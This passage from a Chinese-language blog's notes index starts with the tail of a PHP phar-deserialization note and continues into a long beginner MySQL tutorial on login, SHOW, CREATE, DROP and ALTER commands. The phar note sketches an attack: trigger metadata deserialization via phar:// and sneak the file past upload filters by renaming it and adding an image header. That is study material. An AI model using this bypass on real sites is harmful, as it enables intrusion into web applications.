class="comment">#将自定义的meta-data存入manifest(2)</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;bphar.txt&quot;</span>,<span class="string">&quot;bphar&quot;</span>); <span class="comment">#添加压缩文件(3)</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>(); <span class="comment">#签名自动计算(4)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>在使用Phar:// 协议流解析Phar文件时，Meta-data中的内容都会进行反序列化 (也就是phar文件中的反序列化部分)</p><ul><li>利用：<ol><li>上传phar文件，并借助phar://协议访问phar文件，从而将Meta-data中的内容反序列化</li><li>在创建时必须是phar后缀（$phar = new Phar(“exp.phar”); //.phar文件） 上传时为了绕过限制，则可以修改文件后缀、添加图片头从而达到上传的目的</li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql数据库的基本操作</title>
      <link href="/posts/ff86.html"/>
      <url>/posts/ff86.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h1><p>MySQL 是最流行的关系型数据库管理系统，在 WEB 应用方面 MySQL 是最好的 RDBMS(关系数据库管理系统)应用软件之一</p><hr><h2 id="什么是数据库？"><a href="#什么是数据库？" class="headerlink" title="什么是数据库？"></a>什么是数据库？</h2><p>数据库（Database）是按照数据结构来组织、存储和管理数据的仓库。</p><p>每个数据库都有一个或多个不同的 API 用于创建，访问，管理，搜索和复制所保存的数据。</p><p>我们也可以将数据存储在文件中，但是在文件中读写数据速度相对较慢。</p><p>所以，现在我们使用关系型数据库管理系统（RDBMS）来存储和管理大数据量。</p><p>所谓的关系型数据库，是建立在关系模型基础上的数据库，借助于集合代数等数学概念和方法来处理数据库中的数据。</p><p>RDBMS 即关系数据库管理系统的特点：</p><ul><li>1.数据以表格的形式出现</li><li>2.每行为各种记录名称</li><li>3.每列为记录名称所对应的数据域</li><li>4.许多的行和列组成一张表单</li><li>5.若干的表单组成database</li></ul><hr><h2 id="RDBMS-术语"><a href="#RDBMS-术语" class="headerlink" title="RDBMS 术语"></a>RDBMS 术语</h2><p>在我们开始学习MySQL 数据库前，让我们先了解下RDBMS的一些术语：</p><ul><li><strong>数据库:</strong> 数据库是一些关联表的集合。</li><li><strong>数据表:</strong> 表是数据的矩阵。在一个数据库中的表看起来像一个简单的电子表格。</li><li><strong>列:</strong> 一列(数据元素) 包含了相同类型的数据, 例如邮政编码的数据。</li><li><strong>行：</strong> 一行（=元组，或记录）是一组相关的数据，例如一条用户订阅的数据。</li><li><strong>冗余</strong>：存储两倍数据，冗余降低了性能，但提高了数据的安全性。</li><li><strong>主键</strong>：主键是唯一的。一个数据表中只能包含一个主键。你可以使用主键来查询数据。</li><li><strong>外键：</strong> 外键用于关联两个表。</li><li><strong>复合键</strong>：复合键（组合键）将多个列作为一个索引键，一般用于复合索引。</li><li><strong>索引：</strong> 使用索引可快速访问数据库表中的特定信息。索引是对数据库表中一列或多列的值进行排序的一种结构。类似于书籍的目录。</li><li><strong>参照完整性:</strong> 参照的完整性要求关系中不允许引用不存在的实体。与实体完整性是关系模型必须满足的完整性约束条件，目的是保证数据的一致性。</li></ul><p>MySQL 为关系型数据库, 这种所谓的”关系型”可以理解为”表格”的概念, 一个关系型数据库由一个或数个表格组成, 如图所示的一个表格:</p><p><img src="https://www.runoob.com/wp-content/uploads/2014/03/0921_1.jpg" alt="img"></p><ul><li>表头(header): 每一列的名称;</li><li>列(col): 具有相同数据类型的数据的集合;</li><li>行(row): 每一行用来描述某条记录的具体信息;</li><li>值(value): 行的具体信息, 每个值必须与该列的数据类型相同;</li><li>键(key): 键的值在当前列中具有唯一性。</li></ul><hr><h2 id="MySQL数据库"><a href="#MySQL数据库" class="headerlink" title="MySQL数据库"></a>MySQL数据库</h2><p>MySQL 是一个关系型数据库管理系统，由瑞典 MySQL AB 公司开发，目前属于 Oracle 公司。</p><p>MySQL 是一种关联数据库管理系统，关联数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。</p><ul><li>MySQL 是开源的，目前隶属于 Oracle 旗下产品。</li><li>MySQL 支持大型的数据库。可以处理拥有上千万条记录的大型数据库。</li><li>MySQL 使用标准的 SQL 数据语言形式。</li><li>MySQL 可以运行于多个系统上，并且支持多种语言。这些编程语言包括 C、C++、Python、Java、Perl、PHP、Eiffel、Ruby 和 Tcl 等。</li><li>MySQL 对 PHP 有很好的支持，PHP 是很适合用于 Web 程序开发。</li><li>MySQL 支持大型数据库，支持 5000 万条记录的数据仓库，32 位系统表文件最大可支持 4GB，64 位系统支持最大的表文件为8TB。</li><li>MySQL 是可以定制的，采用了 GPL 协议，你可以修改源码来开发自己的 MySQL 系统。</li></ul><h1 id="2-MYSQL数据库的链接"><a href="#2-MYSQL数据库的链接" class="headerlink" title="2.MYSQL数据库的链接"></a>2.MYSQL数据库的链接</h1><h2 id="MYSQL登录与退出"><a href="#MYSQL登录与退出" class="headerlink" title="MYSQL登录与退出"></a>MYSQL登录与退出</h2><p>启动输入以下命令即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mysql stop/start</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd D:\phpstudy_pro\Extensions\MySQL5.7.26\bin</span><br></pre></td></tr></table></figure><p>输入 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -proot -P 3306 -h 127.0.0.1</span><br></pre></td></tr></table></figure><p>通过 MySQL 自带的客户端工具登录到 MySQL 数据库中,输入以下格式的命名:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 主机名 -u 用户名 -p</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><strong>-h</strong> : 指定客户端所要登录的 MySQL 主机名, 登录本机(localhost 或 127.0.0.1)该参数可以省略;</li><li><strong>-u</strong> : 登录的用户名;</li><li><strong>-p</strong> : 告诉服务器将会使用一个密码来登录, 如果所要登录的用户名密码为空, 可以忽略此选项。</li><li><strong>-P</strong> ：指定登录主机的地址</li></ul><p>如果我们要登录本机的 MySQL 数据库，只需要输入以下命令即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -proot</span><br></pre></td></tr></table></figure><p>按回车确认, 如果安装正确且 MySQL 正在运行, 会得到以下响应:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter password:</span><br></pre></td></tr></table></figure><p>若密码存在, 输入密码登录, 不存在则直接按回车登录。</p><p>登录成功后你将会看到 Welcome to the MySQL monitor… 的提示语。</p><p>退出的三种方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; exit;</span><br><span class="line"></span><br><span class="line">mysql &gt; quit;</span><br><span class="line"></span><br><span class="line">mysql &gt; \q;</span><br></pre></td></tr></table></figure><h1 id="3-常用命令"><a href="#3-常用命令" class="headerlink" title="3.常用命令"></a>3.常用命令</h1><p>以下列出了使用Mysql数据库过程中常用的命令：</p><ul><li><p><strong>USE 数据库名:</strong><br>选择要操作的Mysql数据库</p><p>使用该命令后所有Mysql命令都只针对该数据库。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use RUNOOB;</span><br><span class="line">Database changed</span><br></pre></td></tr></table></figure></li><li><p><strong>SHOW DATABASES:</strong><br>列出 MySQL 数据库管理系统的数据库列表。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW DATABASES;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| RUNOOB             |</span><br><span class="line">| cdcol              |</span><br><span class="line">| mysql              |</span><br><span class="line">| onethink           |</span><br><span class="line">| performance_schema |</span><br><span class="line">| phpmyadmin         |</span><br><span class="line">| test               |</span><br><span class="line">| wecenter           |</span><br><span class="line">| wordpress          |</span><br><span class="line">+--------------------+</span><br><span class="line">10 rows in set (0.02 sec)</span><br></pre></td></tr></table></figure></li><li><p><strong>SHOW TABLES:</strong><br>显示指定数据库的所有表</p><p>使用该命令前需要使用 use 命令来选择要操作的数据库。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use RUNOOB;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; SHOW TABLES;</span><br><span class="line">+------------------+</span><br><span class="line">| Tables_in_runoob |</span><br><span class="line">+------------------+</span><br><span class="line">| employee_tbl     |</span><br><span class="line">| runoob_tbl       |</span><br><span class="line">| tcount_tbl       |</span><br><span class="line">+------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p><strong>SHOW COLUMNS FROM *数据表*:</strong><br>显示数据表的属性，属性类型，主键信息 ，是否为 NULL，默认值等其他信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW COLUMNS FROM runoob_tbl;</span><br><span class="line">+-----------------+--------------+------+-----+---------+-------+</span><br><span class="line">| Field           | Type         | Null | Key | Default | Extra |</span><br><span class="line">+-----------------+--------------+------+-----+---------+-------+</span><br><span class="line">| runoob_id       | int(11)      | NO   | PRI | NULL    |       |</span><br><span class="line">| runoob_title    | varchar(255) | YES  |     | NULL    |       |</span><br><span class="line">| runoob_author   | varchar(255) | YES  |     | NULL    |       |</span><br><span class="line">| submission_date | date         | YES  |     | NULL    |       |</span><br><span class="line">+-----------------+--------------+------+-----+---------+-------+</span><br><span class="line">4 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure></li></ul><h1 id="4-MySQL查看数据库"><a href="#4-MySQL查看数据库" class="headerlink" title="4.MySQL查看数据库"></a>4.MySQL查看数据库</h1><p>数据库可以看作是一个专门存储数据对象的容器，每一个数据库都有唯一的名称，并且数据库的名称都是有实际意义的，这样就可以清晰的看出每个数据库用来存放什么数据。在 <a href="http://c.biancheng.net/mysql/">MySQL</a> 数据库中存在系统数据库和自定义数据库，系统数据库是在安装 MySQL 后系统自带的数据库，自定义数据库是由用户定义创建的数据库。</p><p>在 MySQL 中，可使用 <strong>SHOW DATABASES</strong> 语句来查看或显示当前用户权限范围以内的数据库。查看数据库的语法格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW DATABASES [LIKE &#x27;数据库名&#x27;];</span><br></pre></td></tr></table></figure><p>语法说明如下：</p><ul><li>LIKE 从句是可选项，用于匹配指定的数据库名称。LIKE 从句可以部分匹配，也可以完全匹配。</li><li>数据库名由单引号<code>&#39; &#39;</code>包围。</li></ul><h4 id="实例1：查看所有数据库"><a href="#实例1：查看所有数据库" class="headerlink" title="实例1：查看所有数据库"></a>实例1：查看所有数据库</h4><p>列出当前用户可查看的所有数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW DATABASES;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sakila             |</span><br><span class="line">| sys                |</span><br><span class="line">| world              |</span><br><span class="line">+--------------------+</span><br><span class="line">6 row in set (0.22 sec)</span><br></pre></td></tr></table></figure><p>可以发现，在上面的列表中有 6 个数据库，它们都是安装 MySQL 时系统自动创建的，其各自功能如下：</p><ul><li>information_schema：主要存储了系统中的一些数据库对象信息，比如用户表信息、列信息、权限信息、字符集信息和分区信息等。</li><li>mysql：MySQL 的核心数据库，类似于 SQL Server 中的 master 表，主要负责存储数据库用户、用户访问权限等 MySQL 自己需要使用的控制和管理信息。常用的比如在 mysql 数据库的 user 表中修改 root 用户密码。</li><li>performance_schema：主要用于收集数据库服务器性能参数。</li><li>sakila：MySQL 提供的样例数据库，该数据库共有 16 张表，这些数据表都是比较常见的，在设计数据库时，可以参照这些样例数据表来快速完成所需的数据表。</li><li>sys：MySQL 5.7 安装完成后会多一个 sys 数据库。sys 数据库主要提供了一些视图，数据都来自于 performation_schema，主要是让开发者和使用者更方便地查看性能问题。</li><li>world：world 数据库是 MySQL 自动创建的数据库，该数据库中只包括 3 张数据表，分别保存城市，国家和国家使用的语言等内容。</li></ul><h4 id="实例2：创建并查看数据库"><a href="#实例2：创建并查看数据库" class="headerlink" title="实例2：创建并查看数据库"></a>实例2：创建并查看数据库</h4><p>先创建一个名为 test_db 的数据库：</p><p>mysql&gt; CREATE DATABASE test_db;<br>Query OK, 1 row affected (0.12 sec)</p><p>再使用 SHOW DATABASES 语句显示权限范围内的所有数据库名，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW DATABASES;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sakila             |</span><br><span class="line">| sys                |</span><br><span class="line">| test_db            |</span><br><span class="line">| world              |</span><br><span class="line">+--------------------+</span><br><span class="line">7 row in set (0.22 sec)</span><br></pre></td></tr></table></figure><p>你看，刚才创建的数据库已经被显示出来了。</p><h4 id="实例3：使用-LIKE-从句"><a href="#实例3：使用-LIKE-从句" class="headerlink" title="实例3：使用 LIKE 从句"></a>实例3：使用 LIKE 从句</h4><p>先创建三个数据库，名字分别为 test_db、db_test、db_test_db。</p><p>\1) 使用 LIKE 从句，查看与 test_db 完全匹配的数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW DATABASES LIKE &#x27;test_db&#x27;;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database (test_db) |</span><br><span class="line">+--------------------+</span><br><span class="line">| test_db            |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.03 sec)</span><br></pre></td></tr></table></figure><p>\2) 使用 LIKE 从句，查看名字中包含 test 的数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW DATABASES LIKE &#x27;%test%&#x27;;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database (%test%)  |</span><br><span class="line">+--------------------+</span><br><span class="line">| db_test            |</span><br><span class="line">+--------------------+</span><br><span class="line">| db_test_db         |</span><br><span class="line">+--------------------+</span><br><span class="line">| test_db            |</span><br><span class="line">+--------------------+</span><br><span class="line">3 row in set (0.03 sec)</span><br></pre></td></tr></table></figure><p>\3) 使用 LIKE 从句，查看名字以 db 开头的数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW DATABASES LIKE &#x27;db%&#x27;;</span><br><span class="line">+----------------+</span><br><span class="line">| Database (db%) |</span><br><span class="line">+----------------+</span><br><span class="line">| db_test        |</span><br><span class="line">+----------------+</span><br><span class="line">| db_test_db     |</span><br><span class="line">+----------------+</span><br><span class="line">2 row in set (0.03 sec)</span><br></pre></td></tr></table></figure><p>\4) 使用 LIKE 从句，查看名字以 db 结尾的数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW DATABASES LIKE &#x27;%db&#x27;;</span><br><span class="line">+----------------+</span><br><span class="line">| Database (%db) |</span><br><span class="line">+----------------+</span><br><span class="line">| db_test_db     |</span><br><span class="line">+----------------+</span><br><span class="line">| test_db        |</span><br><span class="line">+----------------+</span><br><span class="line">2 row in set (0.03 sec)</span><br></pre></td></tr></table></figure><h1 id="4-MySQL-创建数据库"><a href="#4-MySQL-创建数据库" class="headerlink" title="4.MySQL 创建数据库"></a>4.MySQL 创建数据库</h1><hr><p>我们可以在登陆 MySQL 服务后，使用 <strong>create</strong> 命令创建数据库，语法如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE 数据库名;</span><br></pre></td></tr></table></figure><p>以下命令简单的演示了创建数据库的过程，数据名为 RUNOOB:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create DATABASE RUNOOB;</span><br></pre></td></tr></table></figure><p>可以使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE IF NOT EXISTS RUNOOB;</span><br></pre></td></tr></table></figure><p>创建数据库，该命令的作用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果数据库不存在则创建，存在则不创建。</span><br><span class="line">if not exists表示当相同的表名存在时，则不执行此创建语句，避免语句执行错误</span><br></pre></td></tr></table></figure><p>可以使用<code>SHOW CREATE DATABASE</code>查看数据库的定义声明，发现该数据库的指定字符集为 utf8</p><p>运行结果如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW CREATE DATABASE test_db_char;</span><br><span class="line">+--------------+-----------------------------------------------------+</span><br><span class="line">| Database     | Create Database                                     |</span><br><span class="line">+--------------+-----------------------------------------------------+</span><br><span class="line">| test_db_char | CREATE DATABASE `test_db_char` /*!40100 DEFAULT CHARACTER SET utf8 */ |</span><br><span class="line">+--------------+-----------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>“1 row in set (0.00 sec)”表示集合中有 1 行信息，处理时间为 0.00秒。时间为 0.00 秒并不代表没有花费时间，而是时间非常短，小于 0.01 秒。</p><h1 id="5-MySQL-删除数据库"><a href="#5-MySQL-删除数据库" class="headerlink" title="5.MySQL 删除数据库"></a>5.MySQL 删除数据库</h1><hr><p>使用普通用户登陆 MySQL 服务器，你可能需要特定的权限来创建或者删除 MySQL 数据库</p><p>所以我们这边使用 root 用户登录，root 用户拥有最高权限。</p><p>在删除数据库过程中，务必要十分谨慎，因为在执行删除命令后，所有数据将会消失。</p><p>Drop 命令删除数据库</p><p>drop 命令格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop database &lt;数据库名&gt;;</span><br></pre></td></tr></table></figure><p>例如删除名为 RUNOOB 的数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; drop database RUNOOB;</span><br></pre></td></tr></table></figure><h1 id="6-MySQL-选择数据库"><a href="#6-MySQL-选择数据库" class="headerlink" title="6.MySQL 选择数据库"></a>6.MySQL 选择数据库</h1><p>在你连接到 MySQL 数据库后，可能有多个可以操作的数据库，所以你需要选择你要操作的数据库。</p><hr><p>在 mysql&gt; 提示窗口中可以很简单的选择特定的数据库。你可以使用SQL命令来选择指定的数据库。</p><p>以下实例选取了数据库 RUNOOB:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use RUNOOB</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><p>执行以上命令后，你就已经成功选择了 RUNOOB 数据库</p><p>在后续的操作中都会在 RUNOOB 数据库中执行</p><h1 id="7-MySQL-修改数据库"><a href="#7-MySQL-修改数据库" class="headerlink" title="7.MySQL 修改数据库"></a>7.MySQL 修改数据库</h1><p>校对规则进行修改，数据库的这些特性都储存在 db.opt 文件中。下面我们来介绍一下修改数据库的基本操作。</p><p>在 MySQL 中，可以使用 <strong>ALTER DATABASE</strong> 来修改已经被创建或者存在的数据库的相关参数。修改数据库的语法格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER DATABASE [数据库名] &#123; [ DEFAULT ] CHARACTER SET &lt;字符集名&gt; |[ DEFAULT ] COLLATE &lt;校对规则名&gt;&#125;</span><br></pre></td></tr></table></figure><p>语法说明如下：</p><ul><li>ALTER DATABASE 用于更改数据库的全局特性。</li><li>使用 ALTER DATABASE 需要获得数据库 ALTER 权限。</li><li>数据库名称可以忽略，此时语句对应于默认数据库。</li><li>CHARACTER SET 子句用于更改默认的数据库字符集。</li><li></li></ul><p>查看 test_db 数据库的定义声明的执行结果如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW CREATE DATABASE test_db;</span><br><span class="line">+----------+--------------------------------------------------------+</span><br><span class="line">| Database | Create Database                                        |</span><br><span class="line">+----------+--------------------------------------------------------+</span><br><span class="line">| test_db  | CREATE DATABASE `test_db` /*!40100 DEFAULT CHARACTER SET utf8 */|</span><br><span class="line">+----------+--------------------------------------------------------+</span><br><span class="line">1 row in set (0.05 sec)</span><br></pre></td></tr></table></figure><p>使用命令行工具将数据库 test_db 的指定字符集修改为 gb2312，默认校对规则修改为 gb2312_unicode_ci，输入 SQL 语句与执行结果如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; ALTER DATABASE test_db</span><br><span class="line">    -&gt; DEFAULT CHARACTER SET gb2312</span><br><span class="line">    -&gt; DEFAULT COLLATE gb2312_chinese_ci;</span><br><span class="line">mysql&gt; SHOW CREATE DATABASE test_db;</span><br><span class="line">+----------+--------------------------------------------------------+</span><br><span class="line">| Database | ALTER Database                                        |</span><br><span class="line">+----------+--------------------------------------------------------+</span><br><span class="line">| test_db  | ALTER DATABASE `test_db` /*!40100 DEFAULT CHARACTER SET gb2312 */|</span><br><span class="line">+----------+--------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h1 id="7-MySQL-创建数据表"><a href="#7-MySQL-创建数据表" class="headerlink" title="7.MySQL 创建数据表"></a>7.MySQL 创建数据表</h1><p>创建MySQL数据表需要以下信息：</p><ul><li>表名</li><li>表字段名</li><li>定义每个表字段</li></ul><p>以下为创建MySQL数据表的SQL通用语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在 MySQL 中，可以使用 CREATE TABLE 语句创建表。其语法格式为：</span><br><span class="line">CREATE TABLE &lt;表名&gt; ([表定义选项])[表选项][分区选项];</span><br><span class="line"></span><br><span class="line">其中，[表定义选项]的格式为：</span><br><span class="line">&lt;列名1&gt; &lt;类型1&gt; [,…] &lt;列名n&gt; &lt;类型n&gt;</span><br></pre></td></tr></table></figure><p>以下为创建数据表 runoob_tbl 实例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use RUNOOB;</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; CREATE TABLE runoob_tbl</span><br><span class="line">   -&gt;(</span><br><span class="line">   -&gt; runoob_id INT NOT NULL AUTO_INCREMENT,</span><br><span class="line">   -&gt; runoob_title VARCHAR(100) NOT NULL,</span><br><span class="line">   -&gt; runoob_author VARCHAR(40) NOT NULL,</span><br><span class="line">   -&gt; submission_date DATE,</span><br><span class="line">   -&gt; PRIMARY KEY ( runoob_id )</span><br><span class="line">   -&gt; )ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br><span class="line">   </span><br><span class="line">Query OK, 0 rows affected (0.16 sec)</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><p><strong>注意：</strong>MySQL命令终止符为分号 <strong>;</strong> 。</p><p><strong>注意：</strong> <strong>-&gt;</strong> 是换行符标识，不要复制。</p><h1 id="8-MySQL-删除数据表"><a href="#8-MySQL-删除数据表" class="headerlink" title="8.MySQL 删除数据表"></a>8.MySQL 删除数据表</h1><p>MySQL中删除数据表是非常容易操作的，但是你在进行删除表操作时要非常小心，因为执行删除命令后所有数据都会消失。</p><p>以下为删除MySQL数据表的通用语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE table_name ;</span><br></pre></td></tr></table></figure><p>以下实例删除了数据表runoob_tbl:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use RUNOOB;</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; DROP TABLE runoob_tbl;</span><br><span class="line">Query OK, 0 rows affected (0.8 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><h1 id="9-MySQL-插入数据"><a href="#9-MySQL-插入数据" class="headerlink" title="9.MySQL 插入数据"></a>9.MySQL 插入数据</h1><p>MySQL 表中使用 <strong>INSERT INTO</strong> SQL语句来插入数据。</p><p>你可以通过 mysql&gt; 命令提示窗口中向数据表中插入数据，或者通过PHP脚本来插入数据。</p><p>以下为向MySQL数据表插入数据通用的 <strong>INSERT INTO</strong> SQL语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name ( field1, field2,...fieldN )</span><br><span class="line">                       VALUES</span><br><span class="line">                       ( value1, value2,...valueN 